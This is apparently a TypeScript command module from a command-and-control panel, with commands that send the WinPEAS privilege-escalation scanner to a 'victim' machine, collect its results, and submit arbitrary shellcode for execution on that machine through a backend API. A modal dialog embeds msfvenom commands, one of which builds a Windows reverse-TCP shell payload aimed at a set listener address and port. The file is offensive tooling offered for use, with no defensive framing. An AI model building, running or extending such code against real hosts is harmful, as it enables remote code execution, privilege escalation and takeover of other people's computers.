import { Command } from "@/Interfaces/Command";
import { Module } from "@/Interfaces/Module";

const sendWinPEAS: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Sending WinPEAS to user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/exploit/send_peas?id=" + user.uuid, { method: "POST" });
            const data = await response.json();
            addOutput("WinPEAS sent: " + data.sent);
        } catch (error) {
            console.error("Error sending WinPEAS:", error);
        }
    },
    help: "Send WinPEAS to a victim. Usage: /exploit/winpeas"
};

const receiveWinPEAS: Command = {
    execute: async (user, args, addOutput) => {
        try {
            addOutput("Receiving WinPEAS from user: " + user.uuid);
            const response = await fetch("http://localhost:8000/api/modules/exploit/receive_peas?id=" + user.uuid);
            const data = await response.json();
            addOutput("WinPEAS received: " + data.received);
        } catch (error) {
            console.error("Error receiving WinPEAS:", error);
        }
    },
    help: "Receive WinPEAS from a victim. Usage: /exploit/receive-peas"
};


const shellcode: Command = {
    execute: async (user, args, addOutput) => {
        // Create modal elements
        const modalHTML = `
            <div id="shellcode-modal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-50 z-50">
                <div class="bg-white rounded-lg p-6 shadow-lg w-96">
                    <h2 class="text-lg font-bold mb-4">Enter Shellcode Information</h2>
                    
                    <label class="block mb-2">
                        Shellcode :
                        <textarea id="shellcode" class="w-full border border-gray-300 p-2 rounded" rows="4" placeholder="Enter shellcode.."></textarea>
                    </label>
                    

                    <h3 class="text-md font-semibold mt-4">Example Command to Generate Shellcode:</h3>
                    <p class="text-sm text-gray-600">
                        <code>msfvenom -p windows/exec cmd=cmd.exe -f python # windows/x86/exec for 32 bit systems</code>
                    </p>
                    <h3 class="text-md font-semibold mt-2">How to Parse the Output:</h3>
                    <p class="text-sm text-gray-600">
                        Use this command to print the shellcode in one string:<br>
                        <code>msfvenom --platform windows --arch x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.1.71 LPORT=4444 -b '\\x00\\x0A\\x0D' -f python | grep "buf +=" | cut -d'"' -f2 | tr -d ' ' | tr -d '\\n'</code>
                    </p>

                    <div class="flex justify-end mt-4">
                        <button id="submit-btn" class="bg-blue-500 text-white px-4 py-2 rounded mr-2">Submit</button>
                        <button id="cancel-btn" class="bg-gray-300 text-gray-700 px-4 py-2 rounded">Cancel</button>
                    </div>
                </div>
            </div>
        `;

        document.body.insertAdjacentHTML('beforeend', modalHTML);


        document.getElementById('submit-btn')?.addEventListener('click', async () => {
            const shellcode = (<HTMLTextAreaElement>document.getElementById('shellcode'))?.value;
            const method = (<HTMLSelectElement>document.getElementById('method'))?.value;

            if (!shellcode) {
                addOutput("Shellcode information is incomplete.");
                return;
            }

            // Close modal immediately on submit
            document.getElementById('shellcode-modal')?.remove();

            try {
                addOutput("Sending shellcode to user: " + user.uuid);
                const response = await fetch(`http://localhost:8000/api/modules/exploit/exec_shellcode`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        id: user.uuid,
                        shellcode_x86: '',
                        shellcode_x64: shellcode,
                        method,
                    }),
                });

                if (!response.ok) {
                    throw new Error((await response.json()).detail);
                }

                const data = await response.json();
                addOutput(data.message);
            } catch (error) {
                console.error("Error sending shellcode:", error);
                addOutput("Failed to send shellcode: " + error);
            }
        });

        document.getElementById('cancel-btn')?.addEventListener('click', () => {
            document.getElementById('shellcode-modal')?.remove();
        });
    },
    help: "Send shellcode to a victim. Usage: /exploit/shellcode"
};

export const exploitModule: Module = {
    commands: {
        sendWinPEAS,
        receiveWinPEAS,
        shellcode
    },
    help: "Module for privilege escalation"
};